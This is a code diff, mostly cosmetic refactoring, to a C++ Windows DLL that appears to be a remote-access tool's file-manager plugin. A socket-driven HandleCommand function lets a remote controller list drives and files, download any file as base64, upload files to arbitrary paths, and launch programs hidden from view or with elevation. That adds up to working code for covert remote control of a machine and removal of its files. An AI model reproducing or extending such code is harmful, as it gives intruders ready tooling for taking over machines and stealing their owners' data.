@@ -19,7 +19,6 @@ using namespace std;
 
 static wstring clipboard_path = L"";
 
-// Base64 Alphabet
 static const string base64_chars =
              "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              "abcdefghijklmnopqrstuvwxyz"
@@ -28,7 +27,6 @@ static const string base64_chars =
 static string base64_encode(const vector<uint8_t>& buf) {
     string ret;
     int i = 0;
-    int j = 0;
     uint8_t char_array_3[3];
     uint8_t char_array_4[4];
     size_t in_len = buf.size();
@@ -41,13 +39,12 @@ static string base64_encode(const vector<uint8_t>& buf) {
             char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
             char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
             char_array_4[3] = char_array_3[2] & 0x3f;
-
             for(i = 0; (i <4) ; i++) ret += base64_chars[char_array_4[i]];
             i = 0;
         }
     }
-
     if (i) {
+        int j = 0;
         for(j = i; j < 3; j++) char_array_3[j] = '\0';
         char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
         char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
@@ -60,17 +57,15 @@ static string base64_encode(const vector<uint8_t>& buf) {
 }
 
 static vector<uint8_t> base64_decode(string const& encoded_string) {
-    int in_len = encoded_string.size();
+    size_t in_len = encoded_string.size();
     int i = 0;
-    int j = 0;
     int in_ = 0;
     uint8_t char_array_4[4], char_array_3[3];
     vector<uint8_t> ret;
-
     while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
         char_array_4[i++] = encoded_string[in_]; in_++;
         if (i == 4) {
-            for (i = 0; i <4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
+            for (i = 0; i <4; i++) char_array_4[i] = (uint8_t)base64_chars.find(char_array_4[i]);
             char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
             char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
             char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
@@ -78,10 +73,10 @@ static vector<uint8_t> base64_decode(string const& encoded_string) {
             i = 0;
         }
     }
-
     if (i) {
-        for (j = i; j <4; j++) char_array_4[j] = 0;
-        for (j = 0; j <4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
+        int j = 0;
+        for (j = i; j < 4; j++) char_array_4[j] = 0;
+        for (j = 0; j < 4; j++) char_array_4[j] = (uint8_t)base64_chars.find(char_array_4[j]);
         char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
         char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
         char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
@@ -152,7 +147,6 @@ static void send_drives(SOCKET sock) {
     response["action"] = "filemanager_response";
     response["type"] = "drives";
     json drives = json::array();
-
     wchar_t driveStrings[512];
     DWORD length = GetLogicalDriveStringsW(512, driveStrings);
     if (length > 0) {
@@ -171,27 +165,21 @@ static void send_files(SOCKET sock, wstring path) {
         send_drives(sock);
         return;
     }
-
     if (path.back() != L'\\') path += L"\\";
-
     json response;
     response["action"] = "filemanager_response";
     response["type"] = "files";
     response["path"] = wide_to_utf8(path);
     json files = json::array();
-
     WIN32_FIND_DATAW findData;
     HANDLE hFind = FindFirstFileW((path + L"*").c_str(), &findData);
-
     if (hFind != INVALID_HANDLE_VALUE) {
         do {
             if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
                 continue;
-
             json item;
             item["name"] = wide_to_utf8(findData.cFileName);
             item["date"] = filetime_to_string(findData.ftLastWriteTime);
-
             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                 item["type"] = "Folder";
                 item["size"] = "";
@@ -204,7 +192,6 @@ static void send_files(SOCKET sock, wstring path) {
         } while (FindNextFileW(hFind, &findData));
         FindClose(hFind);
     }
-
     response["files"] = files;
     send_json(sock, response);
 }
@@ -225,7 +212,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
     try {
         json command = json::parse(commandJson ? commandJson : "{}");
         string action = command.value("action", "");
-
         if (action == "getdrives") {
             send_drives(sock);
         }
@@ -266,14 +252,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             string mode = command.value("mode", "normal");
             INT show = SW_SHOWNORMAL;
             if (mode == "hidden") show = SW_HIDE;
-
             HINSTANCE res;
-            if (mode == "runas") {
-                res = ShellExecuteW(NULL, L"runas", path.c_str(), NULL, NULL, show);
-            } else {
-                res = ShellExecuteW(NULL, L"open", path.c_str(), NULL, NULL, show);
-            }
-
+            if (mode == "runas") res = ShellExecuteW(NULL, L"runas", path.c_str(), NULL, NULL, show);
+            else res = ShellExecuteW(NULL, L"open", path.c_str(), NULL, NULL, show);
             if ((uintptr_t)res > 32) send_log(sock, "Executed (" + mode + "): " + wide_to_utf8(path));
             else send_log(sock, "Execute failed: " + get_last_error_message(GetLastError()));
         }
@@ -302,7 +283,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             size_t last_slash = clipboard_path.find_last_of(L"\\");
             wstring filename = (last_slash != wstring::npos) ? clipboard_path.substr(last_slash + 1) : clipboard_path;
             wstring dest_path = dest_dir + filename;
-
             if (CopyFileW(clipboard_path.c_str(), dest_path.c_str(), FALSE)) {
                 send_log(sock, "Pasted: " + wide_to_utf8(dest_path));
                 send_files(sock, dest_dir);
@@ -312,14 +292,17 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
         }
         else if (action == "downloadfile") {
             wstring path = utf8_to_wide(command.value("path", ""));
-            ifstream file(path, ios::binary);
-            if (!file.is_open()) {
+            FILE* f = _wfopen(path.c_str(), L"rb");
+            if (!f) {
                 send_log(sock, "Download failed: Could not open file");
                 return;
             }
-            vector<uint8_t> buffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
-            file.close();
-
+            fseek(f, 0, SEEK_END);
+            long size = ftell(f);
+            fseek(f, 0, SEEK_SET);
+            vector<uint8_t> buffer(size);
+            fread(buffer.data(), 1, size, f);
+            fclose(f);
             json response;
             response["action"] = "filemanager_response";
             response["type"] = "download";
@@ -332,15 +315,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             wstring path = utf8_to_wide(command.value("path", ""));
             string base64_data = command.value("data", "");
             vector<uint8_t> data = base64_decode(base64_data);
-
-            ofstream file(path, ios::binary);
-            if (!file.is_open()) {
+            FILE* f = _wfopen(path.c_str(), L"wb");
+            if (!f) {
                 send_log(sock, "Upload failed: Could not create file");
                 return;
             }
-            file.write((const char*)data.data(), data.size());
-            file.close();
-
+            fwrite(data.data(), 1, data.size(), f);
+            fclose(f);
             send_log(sock, "File uploaded: " + wide_to_utf8(path));
             size_t last_slash = path.find_last_of(L"\\");
             wstring parent = (last_slash != wstring::npos) ? path.substr(0, last_slash) : L"";
